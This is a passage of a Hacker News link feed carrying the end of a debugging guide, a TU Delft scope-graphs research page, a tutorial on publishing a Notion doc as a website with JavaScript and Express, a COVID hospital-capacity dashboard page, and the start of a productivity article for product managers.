surrounding systems; look through updates to hosts and related
applications. Perhaps something interesting happened in the world,
causing load on the service to spike and servers fell over.
</p>

<p>
If nothing in change logs or release notes looks out of ordinary, fall
back to <b>binary search</b>. Simply revert the system to a known good state,
and walk forward till it starts failing; alternatively, go backwards
till it starts working.
</p>
</div>
</div>

<div id="outline-container-orgccc0e1d">
<h3 id="orgccc0e1d">Step away</h3>
<div id="text-orgccc0e1d">
<p>
If nothing else works, taking a break from the problem and letting
your subconscious deal with it can produce really good results.
</p>

<p>
Distract yourself with other, preferably nontechnical things: go for a
walk, move away from the computer, doodle: and recover.
</p>
</div>
</div>

<div id="outline-container-orgd842f28">
<h3 id="orgd842f28">Fix, verify and celebrate!</h3>
<div id="text-orgd842f28">
<p>
Once you have an acceptable fix, you need to release it. I hope you
have established ways to smoothly and quickly release your code (or
plans to make it that way). Validate that the actual and expected
behavior match up.
</p>

<p>
<b>Celebrate</b>! It's time to savor victory: recover from the stress and
take a break. 
</p>

<p>
Things are right with the world again.
</p>
</div>
</div>

<div id="outline-container-org77f7153">
<h3 id="org77f7153">Learn from it!</h3>
<div id="text-org77f7153">
<p>
You aren't done yet.
</p>

<p>
There's a lot to learn from a complex bug: and a lot to do to make
it simpler to deal with the next one. 
</p>
</div>

<div id="outline-container-org66b3a10">
<h4 id="org66b3a10">Build your own knowledge</h4>
<p>
Learning and becoming more familiar with tools that could help debug
the problem sooner can help speed you up significantly the next time around.
</p>
</div>

<div id="outline-container-org7457597">
<h4 id="org7457597">Write a postmortem: build others' knowledge</h4>
<p>
For meaningful investigations, writing it up and sharing it helps
teach others and potentially speed <i>them</i> up significantly.
</p>
</div>

<div id="outline-container-org66136c8">
<h4 id="org66136c8">Make it impossible to happen ever again</h4>
<div id="text-org66136c8">
<p>
Change the system's design to make it completely impossible. Add the
right regressions tests to prevent it from ever happening again. Add
the right unit tests to exercise the responsible piece of code.
</p>

<p>
Alternatively, simple delete the outdated and unused abstraction if possible.
</p>
</div>
</div>

<div id="outline-container-org619f955">
<h4 id="org619f955">Make it very easy to debug if it <i>does</i> happen again</h4>
<div id="text-org619f955">
<p>
Some clues might have been much more helpful than others. If you had
to debug this again, what signal would have made this trivial to
understand and fix?
</p>

<p>
Add the telemetry, logs, alarms or dashboards that would make this bug
a trivial nuisance if it dares to show itself again. <sup><a id="fnr.3" href="#fn.3">3</a></sup>
</p>
</div>
</div>
</div>
</div>

<div id="outline-container-org0f2ef65">
<h2 id="org0f2ef65">War stories</h2>
<p>
I like to believe I've earned my software debugging scars. I'm sure
yours are just as – if not more – impressive, and I'd love to hear
about strange issues you solved, what you do differently from my
approach, and any impressive tricks you use to figure things out:
<a href="mailto:bhalla.kunal+explog@gmail.com">email</a>, <a href="https://twitter.com/kunalbhalla">Twitter</a> <sup><a id="fnr.4" href="#fn.4">4</a></sup>. 
</p>
</div>


</div></div>]]>
            </description>
            <link>https://explog.in/notes/debugging.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25813410</guid>
            <pubDate>Sun, 17 Jan 2021 18:32:00 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Scope Graphs]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25813369">thread link</a>) | @tosh
<br/>
January 17, 2021 | https://pl.ewi.tudelft.nl/research/projects/scope-graphs/ | <a href="https://web.archive.org/web/*/https://pl.ewi.tudelft.nl/research/projects/scope-graphs/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
	  <div>

			

	    <p><img src="https://pl.ewi.tudelft.nl/img/scope-graphs/16377107406_502a126a33_b.jpg" width="100%"></p>

<p>Names are crucial for organizing and understanding programs. Yet names and name binding get a second class treatment in programming language definition. We have a fairly standardized approach based on context-free grammars to provide tool independent descriptions of the syntax of programming languages. There is no analog for describing the name binding rules of programming languages. It is hard to explain the rules and they are encoded in many different ways in implementations of programming language tools.</p>

<p>Scope graphs provide a new approach to defining the name binding rules of programming languages. A scope graph represents the name binding facts of a program using the basic concepts of declarations and reference associated with scopes that are connected by edges. Name resolution is defined by searching for paths from references to declarations in a scope graph. Scope graph diagrams provide an illuminating visual notation for explaining the bindings in programs. But scope graphs are more than pretty pictures. The foundational resolution calculus provides the basis for generic, language-independent implementation of a range of tools involving name binding. The Spoofax language workbench uses scope graphs to implement name resolution in IDEs and memory models in interpreters.</p>

<h2 id="blog-posts--slides--talk-videos">Blog Posts | Slides | Talk Videos</h2>

<ul>
  <li><a href="https://eelcovisser.org/post/309/declarative-type-system-specification-with-statix">Declarative Type System Specification with Statix</a> at WG2.16 in Portland February 2016</li>
  <li><a href="https://eelcovisser.org/post/308/scopes-as-types">Scopes as Types</a> at OOPSLA 2018</li>
  <li><a href="https://eelcovisser.org/post/307/spoofax%3A-live-programming-language-design">Spoofax: Live Programming Language Design</a> at Curry On 2018</li>
  <li><a href="https://eelcovisser.org/post/297/intrinsically-typed-definitional-interpreters-for-imperative-languages">Intrinsically Typed Definitional Interpreters for Imperative Languages</a> at POPL 2018</li>
  <li><a href="https://eelcovisser.org/post/298/scope-graphs%3A-a-fresh-look-at-name-binding-in-programming-languages">Scope Graphs: A Fresh Look at Name Binding in Programming Languages
</a> at Cury On 2017</li>
  <li><a href="https://eelcovisser.org/post/296/scopes-describe-frames%3A-a-uniform-model-for-memory-layout-in-dynamic-semantics">Scopes Describe Frames: A Uniform Model for Memory Layout in Dynamic Semantics
</a> at ECOOP 2016</li>
  <li><a href="https://eelcovisser.org/post/293/a-constraint-based-approach-to-name-binding-and-type-checking-using-scope-graphs">A Constraint-based Approach to Name Binding and Type Checking using Scope Graphs</a></li>
  <li><a href="https://eelcovisser.org/post/289/a-constraint-language-for-static-semantic-analysis-based-on-scope-graphs">A Constraint Language for Static Semantic Analysis based on Scope Graphs</a></li>
  <li><a href="https://eelcovisser.org/post/285/type-dependent-name-resolution">Type-Dependent Name Resolution</a></li>
</ul>

<h2 id="publications">Publications</h2>

<div>
<p><span><h2>2019</h2><ul>
	<li><span><span><a href="https://researchr.org/publication/PelsmaekerAV19">Towards Language-Parametric Semantic Editor Services Based on Declarative Type System Specifications (Brave New Idea Paper)</a></span><a href="https://researchr.org/publication/ecoop-2019">ECOOP 2019</a>:  <a href="https://doi.org/10.4230/LIPIcs.ECOOP.2019.26" target="_blank">[doi]</a></span></li>
	<li><span><span><a href="https://researchr.org/publication/VerguTV19">Scopes and Frames Improve Meta-Interpreter Specialization</a></span><span><a href="https://researchr.org/profile/vladavergu/publications">Vlad A. Vergu</a>, <a href="https://researchr.org/profile/andrewtolmach/publications">Andrew P. Tolmach</a>, <a href="https://researchr.org/profile/eelcovisser/publications">Eelco Visser</a>. </span><a href="https://researchr.org/publication/ecoop-2019">ECOOP 2019</a>:  <a href="https://doi.org/10.4230/LIPIcs.ECOOP.2019.4" target="_blank">[doi]</a></span></li>
</ul></span>

<span><h2>2018</h2><ul>
	<li><span><span><a href="https://researchr.org/publication/PoulsenRTKV18">Intrinsically-typed definitional interpreters for imperative languages</a></span><span><a href="https://researchr.org/profile/casperbachpoulsen/publications">Casper Bach Poulsen</a>, <a href="https://researchr.org/profile/arjenrouvoet/publications">Arjen Rouvoet</a>, <a href="https://researchr.org/profile/andrewtolmach/publications">Andrew P. Tolmach</a>, <a href="https://researchr.org/profile/robbertkrebbers/publications">Robbert Krebbers</a>, <a href="https://researchr.org/profile/eelcovisser/publications">Eelco Visser</a>. </span><span><a href="https://researchr.org/journal/pacmpl/home">PACMPL</a></span>, 2(POPL), 2018.  <a href="http://doi.acm.org/10.1145/3158104" target="_blank">[doi]</a></span></li>
	<li><span><span><a href="https://researchr.org/publication/AntwerpenPRV18">Scopes as types</a></span><span><a href="https://researchr.org/profile/hendrikvanantwerpen/publications">Hendrik van Antwerpen</a>, <a href="https://researchr.org/profile/casperbachpoulsen/publications">Casper Bach Poulsen</a>, <a href="https://researchr.org/profile/arjenrouvoet/publications">Arjen Rouvoet</a>, <a href="https://researchr.org/profile/eelcovisser/publications">Eelco Visser</a>. </span><span><a href="https://researchr.org/journal/pacmpl/home">PACMPL</a></span>, 2(OOPSLA), 2018.  <a href="https://doi.org/10.1145/3276484" target="_blank">[doi]</a></span></li>
</ul></span>

<span><h2>2017</h2><ul>
	<li><span><span><a href="https://researchr.org/publication/VerguHV17">The semantics of name resolution in grace</a></span><span><a href="https://researchr.org/alias/vlad-a.-vergu">Vlad A. Vergu</a>, <a href="https://researchr.org/alias/michiel-haisma">Michiel Haisma</a>, <a href="https://researchr.org/profile/eelcovisser/publications">Eelco Visser</a>. </span><a href="https://researchr.org/publication/dls-2017">DLS 2017</a>: 63-74 <a href="https://doi.org/10.1145/3133841.3133847" target="_blank">[doi]</a></span></li>
</ul></span>

<span><h2>2016</h2><ul>
	<li><span><span><a href="https://researchr.org/publication/PoulsenNTV16Artifact">Scopes Describe Frames: A Uniform Model for Memory Layout in Dynamic Semantics (Artifact)</a></span><span><a href="https://researchr.org/profile/casperbachpoulsen/publications">Casper Bach Poulsen</a>, <a href="https://researchr.org/profile/pierrejeanmichelneron/publications">Pierre Néron</a>, <a href="https://researchr.org/profile/andrewtolmach/publications">Andrew P. Tolmach</a>, <a href="https://researchr.org/profile/eelcovisser/publications">Eelco Visser</a>. </span><span><a href="https://researchr.org/journal/darts/home">darts</a></span>, 2(1), 2016.  <a href="http://dx.doi.org/10.4230/DARTS.2.1.10" target="_blank">[doi]</a></span></li>
	<li><span><span><a href="https://researchr.org/publication/PoulsenNTV16">Scopes Describe Frames: A Uniform Model for Memory Layout in Dynamic Semantics</a></span><span><a href="https://researchr.org/profile/casperbachpoulsen/publications">Casper Bach Poulsen</a>, <a href="https://researchr.org/profile/pierrejeanmichelneron/publications">Pierre Néron</a>, <a href="https://researchr.org/profile/andrewtolmach/publications">Andrew P. Tolmach</a>, <a href="https://researchr.org/profile/eelcovisser/publications">Eelco Visser</a>. </span><a href="https://researchr.org/publication/ecoop-2016">ECOOP 2016</a>:  <a href="http://dx.doi.org/10.4230/LIPIcs.ECOOP.2016.20" target="_blank">[doi]</a></span></li>
	<li><span><span><a href="https://researchr.org/publication/VanAntwerpen2016">A Constraint-based Approach to Name Binding and Type Checking using Scope Graphs</a></span><span><a href="https://researchr.org/profile/hendrikvanantwerpen/publications">Hendrik van Antwerpen</a>. </span>Master's thesis, Delft University of Technology, January 2016. </span></li>
	<li><span><span><a href="https://researchr.org/publication/AntwerpenNTVW16">A constraint language for static semantic analysis based on scope graphs</a></span><span><a href="https://researchr.org/profile/hendrikvanantwerpen/publications">Hendrik van Antwerpen</a>, <a href="https://researchr.org/profile/pierrejeanmichelneron/publications">Pierre Néron</a>, <a href="https://researchr.org/profile/andrewtolmach/publications">Andrew P. Tolmach</a>, <a href="https://researchr.org/profile/eelcovisser/publications">Eelco Visser</a>, <a href="https://researchr.org/profile/guwac/publications">Guido Wachsmuth</a>. </span><a href="https://researchr.org/publication/pepm-2016">PEPM 2016</a>: 49-60 <a href="http://doi.acm.org/10.1145/2847538.2847543" target="_blank">[doi]</a></span></li>
</ul></span>

<span><h2>2015</h2><ul>
	<li><span><span><a href="https://researchr.org/publication/NeronTVW15">A Theory of Name Resolution</a></span><span><a href="https://researchr.org/profile/pierrejeanmichelneron/publications">Pierre Néron</a>, <a href="https://researchr.org/profile/andrewtolmach/publications">Andrew P. Tolmach</a>, <a href="https://researchr.org/profile/eelcovisser/publications">Eelco Visser</a>, <a href="https://researchr.org/profile/guwac/publications">Guido Wachsmuth</a>. </span><a href="https://researchr.org/publication/esop-2015">ESOP 2015</a>: 205-231 <a href="http://dx.doi.org/10.1007/978-3-662-46669-8_9" target="_blank">[doi]</a></span></li>
	<li><span><span><a href="https://researchr.org/publication/TUD-SERG-2015-009">A Constraint Language for Static Semantic Analysis based on Scope Graphs with Proofs</a></span><span><a href="https://researchr.org/profile/hendrikvanantwerpen/publications">Hendrik van Antwerpen</a>, <a href="https://researchr.org/profile/pierrejeanmichelneron/publications">Pierre Néron</a>, <a href="https://researchr.org/profile/andrewtolmach/publications">Andrew P. Tolmach</a>, <a href="https://researchr.org/profile/eelcovisser/publications">Eelco Visser</a>, <a href="https://researchr.org/profile/guwac/publications">Guido Wachsmuth</a>. </span>Technical Report TUD-SERG-2015-009, 2015. </span></li>
	<li><span><span><a href="https://researchr.org/publication/TUD-SERG-2015-006">Language-Independent Type-Dependent Name Resolution</a></span><span><a href="https://researchr.org/profile/hendrikvanantwerpen/publications">Hendrik van Antwerpen</a>, <a href="https://researchr.org/profile/pierrejeanmichelneron/publications">Pierre Néron</a>, <a href="https://researchr.org/profile/andrewtolmach/publications">Andrew P. Tolmach</a>, <a href="https://researchr.org/profile/eelcovisser/publications">Eelco Visser</a>, <a href="https://researchr.org/profile/guwac/publications">Guido Wachsmuth</a>. </span>Technical Report TUD-SERG-2015-006, 2015. </span></li>
</ul></span>

<span><h2>2013</h2><ul>
	<li><span><span><a href="https://researchr.org/publication/WachsmuthKVGV13">A Language Independent Task Engine for Incremental Name and Type Analysis</a></span><span><a href="https://researchr.org/profile/guwac/publications">Guido Wachsmuth</a>, <a href="https://researchr.org/profile/gabrielkonat/publications">Gabriël Konat</a>, <a href="https://researchr.org/profile/vladavergu/publications">Vlad A. Vergu</a>, <a href="https://researchr.org/profile/dannymgroenewegen/publications">Danny M.  Groenewegen</a>, <a href="https://researchr.org/profile/eelcovisser/publications">Eelco Visser</a>. </span><a href="https://researchr.org/publication/sle-2013-0">SLE 2013</a>: 260-280 <a href="http://dx.doi.org/10.1007/978-3-319-02654-1_15" target="_blank">[doi]</a></span></li>
</ul></span>

<span><h2>2012</h2><ul>
	<li><span><span><a href="https://researchr.org/publication/JongeV12-LDTA">A language generic solution for name binding preservation in refactorings</a></span><span><a href="https://researchr.org/profile/maartjedejonge/publications">Maartje  de Jonge</a>, <a href="https://researchr.org/profile/eelcovisser/publications">Eelco Visser</a>. </span><a href="https://researchr.org/publication/ldta-2012-0">LDTA 2012</a>: 2 <a href="http://doi.acm.org/10.1145/2427048.2427050" target="_blank">[doi]</a></span></li>
	<li><span><span><a href="https://researchr.org/publication/KonatKWV12">Declarative Name Binding and Scope Rules</a></span><span><a href="https://researchr.org/profile/gabrielkonat/publications">Gabriël Konat</a>, <a href="https://researchr.org/profile/lennartclkats/publications">Lennart C. L. Kats</a>, <a href="https://researchr.org/profile/guwac/publications">Guido Wachsmuth</a>, <a href="https://researchr.org/profile/eelcovisser/publications">Eelco Visser</a>. </span><a href="https://researchr.org/publication/sle-2012-0">SLE 2012</a>: 311-331 <a href="http://dx.doi.org/10.1007/978-3-642-36089-3_18" target="_blank">[doi]</a></span></li>
	<li><span><span><a href="https://researchr.org/publication/KonatVKWV2012">The Spoofax Name Binding Language</a></span><span><a href="https://researchr.org/profile/gabrielkonat/publications">Gabriël Konat</a>, <a href="https://researchr.org/profile/vladavergu/publications">Vlad A. Vergu</a>, <a href="https://researchr.org/profile/lennartclkats/publications">Lennart C. L. Kats</a>, <a href="https://researchr.org/profile/guwac/publications">Guido Wachsmuth</a>, <a href="https://researchr.org/profile/eelcovisser/publications">Eelco Visser</a>. </span>In Companion to the 27th Annual ACM SIGPLAN Conference on Object-Oriented Programming, Systems, Languages, and Applications, OOPSLA 2011, part of SPLASH 2012, Tucson, AR, USA, October 19 - 26, 2012. 2012:  <a href="https://doi.org/10.1145/2384716.2384748" target="_blank">[doi]</a></span></li>
</ul></span>

<span><h2>2006</h2><ul>
	<li><span><span><a href="https://researchr.org/publication/BravenboerDOV06">Program Transformation with Scoped Dynamic Rewrite Rules</a></span><span><a href="https://researchr.org/profile/martinbravenboer/publications">Martin  Bravenboer</a>, <a href="https://researchr.org/profile/arthurvandam/publications">Arthur van Dam</a>, <a href="https://researchr.org/profile/karinaolmos/publications">Karina Olmos</a>, <a href="https://researchr.org/profile/eelcovisser/publications">Eelco Visser</a>. </span><span><a href="https://researchr.org/journal/fuin/home">FUIN</a></span>, 69(1-2):123-178, 2006.  <a href="https://content.iospress.com/articles/fundamenta-informaticae/fi69-1-2-06" target="_blank">[doi]</a></span></li>
</ul></span>

<span><h2>2001</h2><ul>
	<li><span><span><a href="https://researchr.org/publication/Visser01-DR">Scoped Dynamic Rewrite Rules</a></span><span><a href="https://researchr.org/profile/eelcovisser/publications">Eelco Visser</a>. </span><span><a href="https://researchr.org/journal/entcs/home">ENTCS</a></span>, 59(4):375-396, 2001.  <a href="https://doi.org/10.1016/S1571-0661(04)00298-1" target="_blank">[doi]</a></span></li>
</ul></span>
</p></div>


	  </div>
	</div></div>]]>
            </description>
            <link>https://pl.ewi.tudelft.nl/research/projects/scope-graphs/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25813369</guid>
            <pubDate>Sun, 17 Jan 2021 18:29:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to turn a Notion doc into a website]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25813361">thread link</a>) | @ali92hm
<br/>
January 17, 2021 | https://benborgers.com/posts/notion-to-website/ | <a href="https://web.archive.org/web/*/https://benborgers.com/posts/notion-to-website/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>I wrote my own reverse-engineered API for Notion, called Potion. The code is open source on <a href="https://github.com/benborgers/potion">GitHub</a>.</p>
<p>Today, we’re going to use that API to turn a Notion document into a website.</p>
<p>There’s two ways of doing it: using a <strong>static website</strong> (no server), or using a <strong>Node.js server</strong>. We’ll also discuss the pros and cons of each.</p>
<h2>Getting the ID of your Notion doc</h2><p>For both of these methods, you’ll need the ID of your Notion doc.</p>
<p>First, make the Notion doc public using the <strong>Share</strong> button in the top right corner:</p>
<p><a href="https://benborgers.com/assets/notion-public-access.png" target="_blank">
            <img src="https://images.weserv.nl/?url=https://benborgers.com/assets/notion-public-access.png&amp;w=900&amp;we">
        </a></p>
<p>Then, click the <strong>Copy page link</strong> button and paste it somewhere. The long random string of characters in that link is the document ID:</p>
<p><a href="https://benborgers.com/assets/notion-doc-id.png" target="_blank">
            <img src="https://images.weserv.nl/?url=https://benborgers.com/assets/notion-doc-id.png&amp;w=900&amp;we">
        </a></p>
<p>We’ll use this ID in our code later.</p>
<h2>Method 1: Static website</h2><p>The benefits of this approach are that you can host the website very cheaply (for example, on <a href="https://netlify.com/">Netlify</a>) since it’s just static files. However, the webpage is empty before the javascript executes, and crawlers (like Google) need to run the javascript in order to “see” the contents.</p>
<p>Let’s set up the skeleton of the web page:</p>
<pre><code><span><span>&lt;!</span><span>DOCTYPE</span> <span>html</span><span>&gt;</span></span><br><span><span><span>&lt;</span>html</span> <span>lang</span><span><span>=</span><span>"</span>en<span>"</span></span><span>&gt;</span></span><span><br>  </span><span><span><span>&lt;</span>head</span><span>&gt;</span></span><span><br>    </span><span><span><span>&lt;</span>title</span><span>&gt;</span></span><span>Notion Doc</span><span><span><span>&lt;/</span>title</span><span>&gt;</span></span><span><br>    </span><span><span><span>&lt;</span>meta</span> <span>name</span><span><span>=</span><span>"</span>viewport<span>"</span></span> <span>content</span><span><span>=</span><span>"</span>width=device-width, initial-scale=1<span>"</span></span> <span>/&gt;</span></span><span><br>    </span><span><span><span>&lt;</span>link</span> <span>rel</span><span><span>=</span><span>"</span>stylesheet<span>"</span></span> <span>href</span><span><span>=</span><span>"</span>/style.css<span>"</span></span> <span>/&gt;</span></span><span><br>    </span><span><span><span>&lt;</span>script</span> <span>src</span><span><span>=</span><span>"</span>/script.js<span>"</span></span> <span>defer</span><span>&gt;</span></span><span></span><span><span><span>&lt;/</span>script</span><span>&gt;</span></span><span><br>  </span><span><span><span>&lt;/</span>head</span><span>&gt;</span></span><span><br>  </span><span><span><span>&lt;</span>body</span><span>&gt;</span></span><span><br>    </span><span><span><span>&lt;</span>main</span><span>&gt;</span></span><span><span><span>&lt;/</span>main</span><span>&gt;</span></span><span><br>  </span><span><span><span>&lt;/</span>body</span><span>&gt;</span></span><span><br></span><span><span><span>&lt;/</span>html</span><span>&gt;</span></span></code></pre>
<p>This empty HTML page links a javascript file (at <code>/script.js</code>) and a CSS file (<code>/style.css</code>).</p>
<p>I also added an empty <code>&lt;main&gt;</code> element in the body, which is where we’ll load the Notion doc into.</p>
<p>Then, I wrote some javascript in <code>script.js</code> that makes a request to the Potion API and fills in the <code>&lt;main&gt;</code> element with the result. It uses the Notion document ID you copied earlier.</p>
<pre><code><span>const</span> notionDocId <span>=</span> <span>"0cb628857f3c4c77bf7f9a879a6ec21d"</span><p><span>fetch</span><span>(</span><span>"https://potion-api.now.sh/html?id="</span> <span>+</span> notionDocId<span>)</span><br>  <span>.</span><span>then</span><span>(</span><span>res</span> <span>=&gt;</span> res<span>.</span><span>text</span><span>(</span><span>)</span><span>)</span><br>  <span>.</span><span>then</span><span>(</span><span>text</span> <span>=&gt;</span> <span>{</span><br>    document<span>.</span><span>querySelector</span><span>(</span><span>"main"</span><span>)</span><span>.</span>innerHTML <span>=</span> text<br>  <span>}</span><span>)</span></p></code></pre>
<p>That’s it! Now you have a website powered by your Notion doc. Here’s the full code if you’d like to check it out: <a href="https://notion-to-website-static.glitch.me/">Live demo</a> and <a href="https://glitch.com/edit/#!/notion-to-website-static">source code</a>.</p>
<h2>Method 2: Node.js server</h2><p>The benefits of this approach are that the HTML sent by the server fully includes the Notion document’s content, so it’s easy for web crawlers (like Google) to read and understand. It doesn’t require any client-side javascript to run. However, you need to run a full Node.js server to host it, so this solution can’t be hosted on a static file host.</p>
<p>I started by installing <code>express</code>, a framework for Node.js servers, and <code>node-fetch</code>, a package that replicates the <code>fetch</code> API in Node.js.</p>
<pre><code><span>const</span> express <span>=</span> <span>require</span><span>(</span><span>"express"</span><span>)</span><br><span>const</span> app <span>=</span> <span>express</span><span>(</span><span>)</span><p><span>const</span> fetch <span>=</span> <span>require</span><span>(</span><span>"node-fetch"</span><span>)</span></p><p>app<span>.</span><span>listen</span><span>(</span>process<span>.</span>env<span>.</span><span>PORT</span><span>)</span></p></code></pre>
<p>Then, I added this Express route. It uses the Notion doc ID you copied earlier, makes a request to the Potion API, and then inserts the result of the API request in an HTML document on the server.</p>
<pre><code>app<span>.</span><span>get</span><span>(</span><span>"/"</span><span>,</span> <span>(</span><span>req<span>,</span> res</span><span>)</span> <span>=&gt;</span> <span>{</span><br>  <span>const</span> notionDocId <span>=</span> <span>"0cb628857f3c4c77bf7f9a879a6ec21d"</span><p>  <span>fetch</span><span>(</span><span>"https://potion-api.now.sh/html?id="</span> <span>+</span> notionDocId<span>)</span><br>    <span>.</span><span>then</span><span>(</span><span>res</span> <span>=&gt;</span> res<span>.</span><span>text</span><span>(</span><span>)</span><span>)</span><br>    <span>.</span><span>then</span><span>(</span><span>text</span> <span>=&gt;</span> <span>{</span><br>      res<span>.</span><span>send</span><span>(</span><span><span>`</span><span><br>        &lt;!DOCTYPE html&gt;<br>        &lt;html&gt;<br>          &lt;head&gt;<br>            &lt;title&gt;Notion Doc&lt;/title&gt;<br>            &lt;meta name="viewport" content="width=device-width, initial-scale=1"&gt;<br>            &lt;style&gt;<br>              body {<br>                font-family: system-ui, sans-serif;<br>              }<p>              img {<br>                max-width: 100%;<br>                max-height: 70vh;<br>              }</p><p>              /* add your own CSS to make it look how you want */<br>            &lt;/style&gt;<br>          &lt;/head&gt;<br>          &lt;body&gt;<br>            &lt;main&gt;</p></span><span><span>${</span>text<span>}</span></span><span>&lt;/main&gt;<br>          &lt;/body&gt;<br>        &lt;/html&gt;<br>      </span><span>`</span></span><span>)</span><br>    <span>}</span><span>)</span><br><span>}</span><span>)</span></p></code></pre>
<p>This website looks the exact same, but is generated on the server-side instead of in the browser. Here’s the full code for the Node.js solution: <a href="https://notion-to-website-node.glitch.me/">Live demo</a> and <a href="https://glitch.com/edit/#!/notion-to-website-node">source code</a>.</p>

</div></div>]]>
            </description>
            <link>https://benborgers.com/posts/notion-to-website/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25813361</guid>
            <pubDate>Sun, 17 Jan 2021 18:29:00 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Explore Hospital Occupancy and Covid Patient Transfers]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25813299">thread link</a>) | @flixpar
<br/>
January 17, 2021 | https://covid-hospital-operations.com/patients-static | <a href="https://web.archive.org/web/*/https://covid-hospital-operations.com/patients-static">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>
			<h4>Hospital Occupancy Dashboard</h4>
		</p><div id="static-text-container">
			<p>
				<span id="static-page-p1">
					This interactive dashboard finds the best way to transfer COVID-19 patients between hospitals. You can use it to see which hospitals are over capacity, when and how many additional beds are needed at each hospital (or US state), and the optimal transfer strategy between hospitals.
				</span>
			</p>
			<p>
				<span data-for="static-page-p2">
					<i>How can we better manage COVID capacity in hospital systems?</i>
					<ion-icon name="caret-forward-outline"></ion-icon>
					<ion-icon name="caret-down-outline"></ion-icon>
					<br>
				</span>
				<span id="static-page-p2">
					With the ongoing COVID-19 pandemic, many hospitals across the US are at capacity or are quickly approaching it. Hospitals are coping with the COVID surge through a variety of methods, including opening up new beds, but these are often costly and can hurt the level of care that patients receive. This burden on hospitals can be reduced if we optimally transfer patients from over-capacity hospitals to nearby hospitals that have available space.
					To find the optimal number of patients to transfer and where to transfer them to, we use <a href="https://arxiv.org/abs/2011.03528">mathematical optimization models</a> developed by the <a href="https://systems.jhu.edu/">Johns Hopkins Center for Systems Science and Engineering</a> (JHU CSSE), hospitalization <a href="https://healthdata.gov/dataset/covid-19-reported-patient-impact-and-hospital-capacity-facility">data</a> from the US Department of Health and Human Services (HHS)<span>Latest data from 2021-01-10</span>, and COVID <a href="https://www.cdc.gov/coronavirus/2019-ncov/cases-updates/forecasts-cases.html">forecasts</a> from the US Centers for Disease Control (CDC)<span>Latest forecast from 2021-01-04</span>. To learn more, visit the <a href="https://covid-hospital-operations.com/about">About page</a>.
				</span>
			</p>
			<p>
				Select a state and patient type (ICU or acute) to see the results for <b><span data-contentid="start_date">2021-01-01</span></b> to <b><span data-contentid="end_date">2021-01-30</span></b>. <span>To select hospitals, go to the "Select Displayed Hospitals" section. For more options go to the "Customize Results" page.</span>
			</p>
			
		</div><div id="results-container">
			<div id="progressbar-area">
				<p>
					Updating...
					<br>
					Note: This site solves the optimization model in real time on our server, so you may have to wait briefly while it returns an answer.
				</p>
				</div>
			
			
		</div></div>]]>
            </description>
            <link>https://covid-hospital-operations.com/patients-static</link>
            <guid isPermaLink="false">hacker-news-small-sites-25813299</guid>
            <pubDate>Sun, 17 Jan 2021 18:23:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Productivity for Product Managers]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25813170">thread link</a>) | @laybak
<br/>
January 17, 2021 | https://informedpm.com/posts/productivity-for-product-managers | <a href="https://web.archive.org/web/*/https://informedpm.com/posts/productivity-for-product-managers">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
          <p><span>In a fast-moving product team, it can often feel like there is too much to do but too little time.</span></p> <p><span>I interviewed over 50 PMs last year about their workflows and processes. And here are the distilled learnings, along with advice from productivity gurus, to help you perform better.</span></p>  <p><h3><span>There is No Perfect System</span></h3></p> <p><span>Talking about productivity reminds me of the topic of health and fitness — Everyone has their own opinion. And it is tempting to spend hours perusing fitness blogs to eke out every last bit of "performance gain". All the while </span> <a href="http://www.paulgraham.com/selfindulgence.html" target="_blank"><span>feeling productive</span></a> <span>.</span></p> <p><span>As you work on improving your productivity, don't lose sight of why you're doing it. If your system takes more work to maintain than the time savings it provides, that defeats the whole purpose.</span></p> <p><span>And even if you are convinced that you have a "perfect" system, your needs will certainly evolve over time.</span></p>  <p><h3><span>Beware of Splintering</span></h3></p> <p><span>By far the most common problem from the PMs I talked to was that their team's information was scattered across tools. Ad-hoc Google Docs here. A flurry of Slack messages there. Some decisions were made in-person meetings, while others as comments on Jira tickets.</span></p> <p><span>To combat this, for every </span> <em>important</em> <span> topic, package all relevant context into a single document. This becomes the one place that you will maintain continually. And the one place that the team will check first for clarifications or updates, amidst the endless streams and threads. </span></p> <p><span>For a given topic, this is the hub that connects (and link to) all related fragments of truth.</span></p> <p><img src="https://storage.googleapis.com/rumin-gcs-bucket/newsletter/Hub.png"></p>  <p><h3><span>All-In-One Tools are a Myth</span></h3></p> <p><span>You have probably seen SaaS promising "everything in one place" or that they are the "only tool you will need for X". Well, productivity tools are rarely, if ever, the magic bullet that they like to market themselves to be.</span></p> <p><span>Tools are but one part of the story. An "OK" tool that your team actually uses is much more useful than the "perfect" tool that no one else adopts.</span></p> <p><span>Also, with each new tool you switch to, it comes with an onboarding cost for everyone. It takes time to adapt to a new workflow. And the migration of data often takes a non-trivial amount of work.</span></p> <p><span>Before buying into the promise of a shiny new tool, keep these considerations in mind. You likely don't need more (rigid) tools. There is no panacea.</span></p>  <p><h3><span>Progressively Organize</span></h3></p> <p><span>Being productive and being organized are not always the same thing. Your goal is to get more done, whereas staying organized is merely a means to an end.</span></p> <p><span>When there are more important things to do, organizing information for its own sake is wasteful. Don't let organizing become an excuse not to get real work done. Instead, let the important topics emerge. And then maintain those.</span></p> <p><span>This </span> <a href="https://sive.rs/walkways" target="_blank"><span>story</span></a> <span> from Derek Sivers illustrates the point. As a new college campus was getting built, one question was being debated — "Where in the grass should we put the paved walkways?" And here's the winning idea from one professor:</span></p> <div><blockquote><span>Don’t make any walkways this year. At the end of the year, look where the grass has worn away. That shows where the students are walking. Then just pave those paths.</span></blockquote></div>  